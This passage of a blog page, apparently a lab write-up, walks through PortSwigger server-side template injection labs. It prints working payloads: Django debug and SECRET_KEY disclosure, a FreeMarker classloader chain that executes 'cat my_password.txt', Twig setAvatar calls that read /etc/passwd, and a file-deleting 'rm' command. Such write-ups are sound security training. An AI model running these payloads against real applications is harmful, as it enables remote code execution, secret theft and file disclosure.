+{{/with}}</code></pre>
+        </div>
+
+        <div class="screenshot-grid">
+          <figure class="screenshot-wrap">
+            <img src="../image/SSTI/lab4-documented-exploit-payload.png" alt="Burp Repeater request containing the long Handlebars constructor-chain payload and a rendered page response confirming the gadget path is executing." loading="lazy" />
+            <figcaption class="screenshot-caption">The long payload looks ugly, but the reasoning is simple: rebuild access to a constructor, then use it to execute JavaScript that calls <code>child_process.exec()</code>.</figcaption>
+          </figure>
+          <figure class="screenshot-wrap">
+            <img src="../image/SSTI/lab4-solved.png" alt="Solved lab page after switching the Handlebars payload command to rm /home/carlos/morale.txt." loading="lazy" />
+            <figcaption class="screenshot-caption">After a validation command works, the solve is another command swap: use the same chain, replace <code>whoami</code> with <code>rm /home/carlos/morale.txt</code>.</figcaption>
+          </figure>
+        </div>
+
+        <h3>Why this chain works at all</h3>
+        <p>
+          Handlebars tries to stay logic-light, which is why plain arithmetic or obvious method calls are not enough. The constructor chain matters because it rebuilds a path to native JavaScript execution from objects and helpers the template runtime still exposes. The payload is long because it is assembling capability out of constrained pieces, not because the exploit is fundamentally complicated.
+        </p>
+
+        <div class="callout info">
+          <div class="callout-title">Practical lesson</div>
+          <p>In unknown-engine SSTI, the best use of Burp Intruder is often not "find the final payload". It is "force the application to tell me which syntax family and runtime semantics I am dealing with."</p>
+        </div>
+
+        <div class="lab-takeaway">
+          <div class="takeaway-icon">04</div>
+          <div>
+            <div class="takeaway-title">Takeaway</div>
+            <div class="takeaway-text">Once a stack trace names the engine, the exploit problem becomes much smaller. Unknown-language SSTI often turns into a documentation-and-runtime problem long before it becomes a raw payload-invention problem.</div>
+          </div>
+        </div>
+      </div>
+
+      <hr class="lab-divider">
+
+      <div class="lab-section" id="lab5">
+        <div class="lab-header">
+          <div class="lab-num">05</div>
+          <div>
+            <div class="lab-title-row">
+              <span class="lab-difficulty diff-hybrid">Sandboxed</span>
+            </div>
+            <h2 class="lab-title">Django sandbox disclosure: use <code>{% debug %}</code> to map the context, then pull <code>settings.SECRET_KEY</code></h2>
+            <div class="lab-goal">Goal: <span>Recognize a sandboxed Django template surface and extract sensitive configuration instead of forcing RCE where the engine is trying to stop you.</span></div>
+          </div>
+        </div>
+
+        <p>
+          This lab is the reminder that SSTI is not always about shell commands. Sometimes the framework sandboxes the dangerous primitives well enough that the better outcome is targeted disclosure. In Django, the <code>{% debug %}</code> tag becomes the crucial recon move because it spills the rendering context and tells you which objects are worth reaching for.
+        </p>
+        <p>
+          The context dump immediately exposes a <code>settings</code> object. Once that exists, the shortest path is no longer clever code execution. It is simply <code>{{ settings.SECRET_KEY }}</code>. In a real application, leaking that key can create downstream abuse opportunities far beyond the template itself.
+        </p>
+
+        <div class="screenshot-grid">
+          <figure class="screenshot-wrap">
+            <img src="../image/SSTI/lab5-django-debug-context.png" alt="Template preview showing {% debug %} and a huge context dump that includes product data and settings." loading="lazy" />
+            <figcaption class="screenshot-caption">The debug tag is the pivot. It confirms a Django-style template surface and hands over the rendering context, including the <code>settings</code> object.</figcaption>
+          </figure>
+          <figure class="screenshot-wrap">
+            <img src="../image/SSTI/lab5-secret-key-disclosure.png" alt="Template preview showing {{ settings.SECRET_KEY }} and the secret key printed in the page output." loading="lazy" />
+            <figcaption class="screenshot-caption">Once <code>settings</code> is visible, the key disclosure is direct. No gadget chain is needed because the secret is already reachable from the template context.</figcaption>
+          </figure>
+        </div>
+
+        <div class="payload-box">
+          <span class="payload-label">Recon payload</span>
+          <pre><code>{{product.stock}} left of {{product.name}} at {{product.price}}.&lt;/p&gt;
+
+{% debug %}</code></pre>
+        </div>
+
+        <div class="payload-box">
+          <span class="payload-label">Disclosure payload</span>
+          <pre><code>{{product.stock}} left of {{product.name}} at {{product.price}}.&lt;/p&gt;
+
+{{ settings.SECRET_KEY }}</code></pre>
+        </div>
+
+        <div class="callout warning">
+          <div class="callout-title">Why this is still severe</div>
+          <p>A leaked framework secret is often enough to damage trust boundaries elsewhere: signed cookies, token generation, password reset mechanics, or any other feature that assumes the secret never leaves the server.</p>
+        </div>
+
+        <div class="lab-takeaway">
+          <div class="takeaway-icon">05</div>
+          <div>
+            <div class="takeaway-title">Takeaway</div>
+            <div class="takeaway-text">Sandboxed does not mean safe. If code execution is constrained, the next question should be what high-value data the sandbox still exposes through legitimate template features.</div>
+          </div>
+        </div>
+      </div>
+
+      <hr class="lab-divider">
+
+      <div class="lab-section" id="lab6">
+        <div class="lab-header">
+          <div class="lab-num">06</div>
+          <div>
+            <div class="lab-title-row">
+              <span class="lab-difficulty diff-practitioner">Practitioner</span>
+            </div>
+            <h2 class="lab-title">FreeMarker object abuse: pivot off <code>product.class</code> and use the classloader to recover <code>Execute</code></h2>
+            <div class="lab-goal">Goal: <span>Use a live application object to climb into Java internals and read <code>my_password.txt</code>.</span></div>
+          </div>
+        </div>
+
+        <p>
+          This lab feels different from the earlier FreeMarker one because the exploit path is not just "use the documented helper directly". Here the core trick is that <code>product</code> is not a dead data blob. It is a live Java-backed object, which means template access to <code>product.class</code> opens a path into the underlying runtime.
+        </p>
+        <p>
+          The screenshots show the whole reasoning chain: trigger an undefined-variable error, confirm arithmetic evaluation with <code>${7*7}</code>, verify that the missing <code>user</code> object can still be handled safely with a default, and then use the classloader reached through <code>product.class.protectionDomain.classLoader</code> to load the pieces needed for command execution.
+        </p>
+
+        <div class="screenshot-grid">
+          <figure class="screenshot-wrap">
+            <img src="../image/SSTI/lab6-freemarker-error-fingerprint.png" alt="FreeMarker template editor showing an undefined variable error for ${dfdfd.price}." loading="lazy" />
+            <figcaption class="screenshot-caption">The error page confirms the engine. I deliberately start with a bogus object name so the template itself tells me what parser and error semantics I am dealing with.</figcaption>
+          </figure>
+          <figure class="screenshot-wrap">
+            <img src="../image/SSTI/lab6-arithmetic-confirmation.png" alt="FreeMarker template editor showing ${7*7} and the resulting 49 in the rendered output." loading="lazy" />
+            <figcaption class="screenshot-caption">After the error, the arithmetic check gives a clean execution proof. At this stage we know both the engine and the expression syntax are solid.</figcaption>
+          </figure>
+        </div>
+
+        <div class="payload-box">
+          <span class="payload-label">Full exploit chain</span>
+          <pre><code>${product.stock} left of ${product.name} at ${product.price}.&lt;/p&gt;
+
+${7*7}
+
+${(user.name)!"Guest"}
+
+&lt;#assign classloader=product.class.protectionDomain.classLoader&gt;
+&lt;#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")&gt;
+&lt;#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)&gt;
+&lt;#assign ec=classloader.loadClass("freemarker.template.utility.Execute")&gt;
+${dwf.newInstance(ec,null)("cat my_password.txt")}</code></pre>
+        </div>
+
+        <div class="screenshot-wrap">
+          <img src="../image/SSTI/lab6-objectwrapper-bypass.png" alt="FreeMarker template editor containing the classloader and ObjectWrapper chain, with the response showing 49, Guest, and the contents of my_password.txt." loading="lazy" />
+          <figcaption class="screenshot-caption">This is the important screenshot for the whole lab: arithmetic still works, the missing user is handled with a default, and the classloader chain finally reveals the secret from <code>my_password.txt</code>.</figcaption>
+        </div>
+
+        <h3>Why the object pivot is the real vulnerability</h3>
+        <p>
+          The dangerous part is not just "FreeMarker exists". It is that the template can reach a real object graph with Java metadata attached. Once <code>product.class</code> is reachable, the exploit path starts looking less like templating and more like runtime reflection. That is why object exposure is such a recurring SSTI mistake: the template surface inherits capabilities from the object model underneath it.
+        </p>
+
+        <div class="callout info">
+          <div class="callout-title">Small but important detail</div>
+          <p>The <code>${(user.name)!"Guest"}</code> check is not filler. It proves that the template can gracefully continue even when a variable is absent, which keeps the final exploit payload from failing early on missing data.</p>
+        </div>
+
+        <div class="lab-takeaway">
+          <div class="takeaway-icon">06</div>
+          <div>
+            <div class="takeaway-title">Takeaway</div>
+            <div class="takeaway-text">Exposed objects are capabilities. If a template can walk from business objects into language or runtime metadata, the distinction between "data access" and "code access" starts collapsing very quickly.</div>
+          </div>
+        </div>
+      </div>
+
+      <hr class="lab-divider">
+
+      <div class="lab-section" id="lab7">
+        <div class="lab-header">
+          <div class="lab-num">07</div>
+          <div>
+            <div class="lab-title-row">
+              <span class="lab-difficulty diff-hybrid">Custom exploit</span>
+            </div>
+            <h2 class="lab-title">Twig method abuse: turn the exposed <code>user</code> object and avatar handler into an arbitrary file read chain</h2>
+            <div class="lab-goal">Goal: <span>Use template-exposed object methods, upload behavior, and avatar retrieval to build a custom exploit instead of relying on a stock RCE gadget.</span></div>
+          </div>
+        </div>
+
+        <p>
+          This was the most satisfying lab in the set because the path is assembled from clues rather than one obvious payload. The application leaks just enough about avatar handling, method signatures, and file serving that the template injection becomes a way to repoint the user's avatar at arbitrary filesystem paths.
+        </p>
+        <p>
+          The solving path is worth studying because it mirrors real exploit development much more than the earlier documentation-driven labs do. Each screenshot below removes one uncertainty: first the upload path and MIME validation behavior, then the method signature, then the fact that the avatar endpoint will happily stream arbitrary file contents back as <code>image/unknown</code>.
+        </p>
+
+        <div class="steps">
+          <div class="step">
+            <div class="step-num">1</div>
+            <div class="step-body">
+              <div class="step-title">Start with the upload feature, not the template</div>
+              <p>Uploading a plain-text file as an avatar throws a verbose PHP error that leaks <code>User.php</code>, <code>setAvatar()</code>, the temporary path, and the MIME requirement. That is a recon jackpot.</p>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">2</div>
+            <div class="step-body">
+              <div class="step-title">Probe method invocation through the template</div>
+              <p>Calling <code>user.setAvatar('/home/carlos/User.php')</code> fails, but the failure is perfect: Twig tells us the method exists and expects exactly two arguments.</p>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">3</div>
+            <div class="step-body">
+              <div class="step-title">Supply the missing MIME argument and repoint the avatar</div>
+              <p>Adding <code>'image/png'</code> completes the method call. From there, the avatar retrieval endpoint becomes the read primitive.</p>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num">4</div>
+            <div class="step-body">
+              <div class="step-title">Use unmistakable files as validation targets</div>
+              <p><code>/etc/passwd</code> is the perfect canary. If the avatar endpoint streams it back, the exploit is proven beyond doubt before moving on to more application-specific files.</p>
+            </div>
+          </div>
+        </div>
+
+        <div class="screenshot-grid">
+          <figure class="screenshot-wrap">
+            <img src="../image/SSTI/lab7-avatar-upload-error.png" alt="Avatar upload with a text file causing a PHP fatal error that reveals the MIME check and references User.php." loading="lazy" />
+            <figcaption class="screenshot-caption">The upload error gives away three critical facts at once: the backend is PHP, avatars go through <code>User.php</code>, and <code>setAvatar()</code> cares about MIME strings.</figcaption>
+          </figure>
+          <figure class="screenshot-wrap">
+            <img src="../image/SSTI/lab7-setavatar-arity-error.png" alt="Twig template injection causing an internal server error that says User::setAvatar expects exactly two arguments." loading="lazy" />
+            <figcaption class="screenshot-caption">This is the signature leak that unlocks the chain. The failed method call tells us exactly how to call <code>setAvatar()</code> correctly next time.</figcaption>
+          </figure>
+        </div>
+
+        <div class="payload-box">
+          <span class="payload-label">Method-signature probe</span>
+          <pre><code>user.setAvatar('/home/carlos/User.php')</code></pre>
+        </div>
+
+        <div class="screenshot-wrap">
+          <img src="../image/SSTI/lab7-setavatar-method-call.png" alt="Burp Repeater request using user.setAvatar('/home/carlos/User.php','image/png') in the blog-post-author-display parameter and the blog page reflecting previous test payloads." loading="lazy" />
+          <figcaption class="screenshot-caption">With the second argument added, the method call becomes structurally valid. The page is messy because earlier probes are still reflected, but the important part is that Twig accepts the call.</figcaption>
+        </div>
+
+        <div class="payload-box">
+          <span class="payload-label">Working setter payload</span>
+          <pre><code>user.setAvatar('/home/carlos/User.php','image/png')</code></pre>
+        </div>
+
+        <div class="screenshot-grid">
+          <figure class="screenshot-wrap">
+            <img src="../image/SSTI/lab7-passwd-disclosure.png" alt="GET request to the avatar endpoint returning the contents of /etc/passwd as image/unknown." loading="lazy" />
+            <figcaption class="screenshot-caption">The canary read: when the avatar endpoint returns <code>/etc/passwd</code> as <code>image/unknown</code>, the arbitrary file read is fully confirmed.</figcaption>
+          </figure>
+          <figure class="screenshot-wrap">
+            <img src="../image/SSTI/lab7-empty-file-check.png" alt="GET request to the avatar endpoint returning a short 'Nothing to see here :)' response." loading="lazy" />
+            <figcaption class="screenshot-caption">This failed candidate is useful too. It proves the exploit path is sensitive to the chosen file and keeps the next read grounded in real validation instead of assumption.</figcaption>
+          </figure>
+        </div>
+
+        <div class="screenshot-wrap">
+          <img src="../image/SSTI/lab7-user-php-source-disclosure.png" alt="Avatar endpoint response returning the source code of User.php." loading="lazy" />
+          <figcaption class="screenshot-caption">The final read surfaces <code>User.php</code> source through the avatar endpoint, which is exactly the kind of custom exploit finish this lab is designed to teach.</figcaption>
+        </div>
+
+        <h3>Why this chain is more interesting than a one-shot gadget</h3>
+        <p>
+          The exploit is not "Twig gives RCE by default". The exploit is that a template-exposed object lets us call a state-changing method, and the method writes avatar metadata that another endpoint later trusts when serving files. In other words, the template injection is only one part of the bug. The full break requires understanding how two application features compose badly together.
+        </p>
+
+        <div class="callout warning">
+          <div class="callout-title">The real lesson</div>
+          <p>Custom exploit paths often come from business logic, not just framework magic. If an exposed object has methods that mutate file paths, profile data, permissions, or rendering state, template injection can become the trigger that repoints the application at sensitive resources.</p>
+        </div>
+
+        <div class="lab-takeaway">
+          <div class="takeaway-icon">07</div>
+          <div>
+            <div class="takeaway-title">Takeaway</div>
+            <div class="takeaway-text">The best custom exploits are built from honest clues: feature behavior, method arity, path leaks, and side effects you can validate one step at a time. This lab rewards patient chaining more than flashy payloads.</div>
+          </div>
+        </div>
+      </div>
+
+      <hr class="lab-divider">
+
+      <div class="lab-section" id="recap">
+        <div class="lab-header">
+          <div class="lab-num">R</div>
+          <div>
+            <div class="lab-title-row">
+              <span class="lab-difficulty diff-practitioner">Recap</span>
+            </div>
+            <h2 class="lab-title">What the SSTI track really drills into you</h2>
+            <div class="lab-goal">Goal: <span>Stop thinking of SSTI as a single payload class and start treating it as framework reconnaissance plus capability mapping.</span></div>
+          </div>
+        </div>
+
+        <p>
+          The biggest shift across these labs is mental, not syntactic. Early on, it is tempting to see SSTI as a version of XSS with stranger delimiters. The labs break that habit quickly. What actually matters is which engine is present, where your input lands in template context, which helpers are reachable, what objects are exposed, and how much of the underlying runtime leaks through those objects.
+        </p>
+        <p>
+          That is why I wanted the screenshots in this write-up instead of a cleaned-up payload list alone. The screenshots preserve the path from clue to confidence: <code>49</code> in the right place, an error page that says <code>FreeMarker</code>, a stack trace that says <code>Handlebars</code>, a debug dump that exposes <code>settings</code>, and an avatar endpoint that should never have been a file reader in the first place.
+        </p>
+
+        <div class="recap-grid">
+          <div class="recap-card">
+            <span class="recap-title">Fingerprint first</span>
+            <p>Arithmetic probes, malformed variables, and verbose errors do more work in SSTI than in most other web bug classes because they narrow the runtime immediately.</p>
+          </div>
+          <div class="recap-card">
+            <span class="recap-title">Context beats syntax</span>
+            <p>The difference between text context, expression context, and statement context decides whether a payload works, even when the engine syntax is already known.</p>
+          </div>
+          <div class="recap-card">
+            <span class="recap-title">Objects are attack surface</span>
+            <p>Live objects, methods, class metadata, and helper utilities often matter more than raw template evaluation alone. Business objects can become capability leaks.</p>
+          </div>
+          <div class="recap-card">
+            <span class="recap-title">Sandboxes still leak value</span>
+            <p>If a sandbox blocks easy code exec, pivot to configuration secrets, framework internals, or application state that the template can still reach legitimately.</p>
+          </div>
+        </div>
+
+        <div class="callout success">
+          <div class="callout-title">Where this helps next</div>
+          <p>The same habit transfers cleanly into SSTI-adjacent bugs and modern server-side features: map the parser, map the object model, then ask what the application still lets your input influence after it crosses the trust boundary.</p>
+        </div>
+      </div>
+    </article>
+
+    <section class="post-navigation" aria-labelledby="post-navigation-title">
+      <div class="post-section-head">
+        <div>
+          <span class="post-section-label">Continue reading</span>
+          <h2 id="post-navigation-title" class="post-section-title">Move through the archive</h2>
+        </div>
+        <a href="../blog.html" class="btn">Browse all posts</a>
+      </div>
+      <div class="post-nav-grid"><a href="jwt-labs.html" class="post-nav-card">
+  <span class="post-nav-label">Older post</span>
+  <strong class="post-nav-title">PortSwigger JWT Labs Write-Up</strong>
+  <span class="post-nav-meta">2026-06-07 . ~50 min read</span>
+</a></div>
+    </section>
+    <section class="post-related" aria-labelledby="related-posts-title">
+      <div class="post-section-head">
+        <div>
+          <span class="post-section-label">Keep exploring</span>
+          <h2 id="related-posts-title" class="post-section-title">Related posts</h2>
+        </div>
+        <p class="post-section-copy">More write-ups that overlap on Burp workflow, PortSwigger training targets, and the habit of proving each step before automating anything.</p>
+      </div>
+      <div class="related-posts-grid"><a href="jwt-labs.html" class="related-post-card">
+  <div class="related-post-meta">
+    <span class="post-date">2026-06-07</span>
+    <span class="post-tag">Web</span><span class="post-tag">JWT</span>
+  </div>
+  <h3 class="related-post-title">PortSwigger JWT Labs Write-Up</h3>
+  <p class="related-post-excerpt">A Burp-first walkthrough of PortSwigger's JWT labs, covering none-alg abuse, weak secrets, header injection, and algorithm confusion.</p>
+  <span class="related-post-read">Read article</span>
+</a><a href="sqli-labs.html" class="related-post-card">
+  <div class="related-post-meta">
+    <span class="post-date">2026-04-02</span>
+    <span class="post-tag">Web</span><span class="post-tag">Port Swigger</span>
+  </div>
+  <h3 class="related-post-title">PortSwigger SQLi Labs Write-Up</h3>
+  <p class="related-post-excerpt">Structured SQL injection lab walkthroughs with manual validation, payload reasoning, and Python-assisted exploitation.</p>
+  <span class="related-post-read">Read article</span>
+</a><a href="burp-suite-basics.html" class="related-post-card">
+  <div class="related-post-meta">
+    <span class="post-date">2025-07-23</span>
+    <span class="post-tag">Burp Suite</span>
+  </div>
+  <h3 class="related-post-title">Getting Started with Burp Suite</h3>
+  <p class="related-post-excerpt">A practical introduction to Proxy, Repeater, Intruder, and the manual workflow that sits underneath most of these lab write-ups.</p>
+  <span class="related-post-read">Read article</span>
+</a></div>
+    </section>
+    <div class="post-footer">
+      <a href="../blog.html" class="btn">&larr; Back to blog</a>
+      <span class="post-footer-note">Open any screenshot to zoom in. I kept the solving trail visible on purpose so the payload logic stays attached to the evidence that justified it.</span>
+    </div>
+  </div>
+  <footer>
+    <span>(c) 2026 Vali Hakuryuko</span>
+    <span class="footer-back" onclick="window.scrollTo({top:0,behavior:'smooth'})">^ back to top</span>
+  </footer>
+  <script src="../script.js"></script>
+</body>
+</html>
